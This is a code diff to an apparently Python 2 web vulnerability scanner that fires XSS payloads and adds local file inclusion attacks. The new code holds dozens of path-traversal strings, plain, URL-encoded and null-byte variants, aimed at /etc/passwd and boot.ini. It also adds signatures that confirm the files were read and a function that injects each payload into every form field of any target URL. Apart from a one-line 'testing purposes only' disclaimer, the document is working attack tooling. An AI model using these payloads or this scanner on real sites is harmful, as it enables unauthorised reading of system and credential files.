@@ -16,6 +16,38 @@ xss_attacks = [ "<script>alert(1);</script>", "<img src=x onerror=prompt(/test/)
                 "</title><script>alert(1);</script>", "<body background=\"javascript:alert(1)\">",
                 "<img src=test123456.jpg onerror=alert(1)>"]
 
+lfi_attacks = [
+                #linux
+                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
+                '../../../../../etc/passwd', '../../../../../../etc/passwd',
+                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',
+                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',
+                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',
+                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',
+                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
+                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
+                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
+
+                #windows
+                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',
+                '../../../../../boot.ini', '../../../../../../boot.ini',
+                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',
+                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
+                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
+                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
+                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',
+                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',
+                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',
+                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
+                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
+                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'
+                ]
+
+lfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']
+
 def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
     global xss_attacks
     global DEBUG
@@ -70,6 +102,63 @@ def check_xss(host, page, method, params, hidden_param_name, hidden_param_value,
             return
     return
 
+def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
+    global lfi_attacks
+    global lfi_expect
+    global DEBUG
+    if page.find("http://") == 0 or page.find("https://") == 0:
+        furl = page
+    else:
+        if _url.find("https://") == 0:
+            furl = "https://" + host + "/" + page
+        else:
+            furl = "http://" + host + "/" + page
+
+    print "[+] LFI check for: " + furl
+    if DEBUG == 1:
+        print "Params: "
+        print params
+        print hidden_param_name
+        print hidden_param_value
+
+    counter = 0
+    for lfi in lfi_attacks:
+        post_params={}
+        counter+=1
+        parameters = ""
+        for i in range(0,len(params)):
+            for j in range(0, len(params)):
+                if j==i:
+                    post_params[params[j]] = lfi
+                else:
+                    post_params[params[j]] = 0
+
+        #add any hidden parameters
+        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
+            for i in range(0,len(hidden_param_name)):
+                post_params[hidden_param_name[i]] = hidden_param_value[i]
+
+        if method.find("get") == 0:
+            r=requests.get(url = furl, params = post_params)
+        else:
+            r=requests.post(furl, data=post_params)
+
+        if DEBUG == 1:
+            print post_params
+            with open("response_" + str(form_counter) + "_" + str(counter) + ".html", "w") as f:
+                f.write(r.content)
+
+        for lfi_result in lfi_expect:
+            if r.content.find(lfi_result)>=0:
+                print "[+] Target is VULNERABLE"
+                print "Url: " + url
+                print "Parameters: %s\n" % str(post_params)
+
+                #comment out the return if you want all the findings
+                return
+    return
+
+
 def scan_for_forms(fname, host, url):
     print "[+] Start scan"
     rtype=""
@@ -89,6 +178,7 @@ def scan_for_forms(fname, host, url):
                     has_form=0
                     if len(page) > 0 and len(params) > 0:
                         check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
+                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                         params=[]
                         hidden_param_name=[]
                         hidden_param_value=[]
@@ -137,37 +227,38 @@ def banner():
     print "DISCLAIMER: For testing purposes only!\n"
 
 ###MAIN###
-banner()
+if __name__ == "__main__":
+    banner()
 
-if len(sys.argv) != 2:
-    print "program [url]"
-    exit()
+    if len(sys.argv) != 2:
+        print "program [url]"
+        exit()
 
-url = sys.argv[1]
-if url.find("http") != 0:
-    print "[-] Invalid target"
-    exit()
+    url = sys.argv[1]
+    if url.find("http") != 0:
+        print "[-] Invalid target"
+        exit()
 
-m=re.match(r'(http|https):\/\/([^\/]+)', url, re.I|re.M)
-if m:
-    host = m.group(2)
-else:
-    print "[-] Can't get host information"
-    exit()
+    m=re.match(r'(http|https):\/\/([^\/]+)', url, re.I|re.M)
+    if m:
+        host = m.group(2)
+    else:
+        print "[-] Can't get host information"
+        exit()
 
-print "[+] Host acquired " + host
-print "[+] Retrieve page"
-try:
-    r = requests.get(url)
-    s = r.content.replace(">", ">\n")
+    print "[+] Host acquired " + host
+    print "[+] Retrieve page"
+    try:
+        r = requests.get(url)
+        s = r.content.replace(">", ">\n")
 
-    #good to have a local copy for testing
-    with open("page.txt", "w") as f:
-        f.write(s)
+        #good to have a local copy for testing
+        with open("tmpage.txt", "w") as f:
+            f.write(s)
 
-    scan_for_forms("page.txt", host, url)
-    os.remove("page.txt")
-except Exception, e:
-    print "[-] Main(): Error " + str(e)
+        scan_for_forms("tmpage.txt", host, url)
+        os.remove("tmpage.txt")
+    except Exception, e:
+        print "[-] Main(): Error " + str(e)
 
 print "[*] Done"
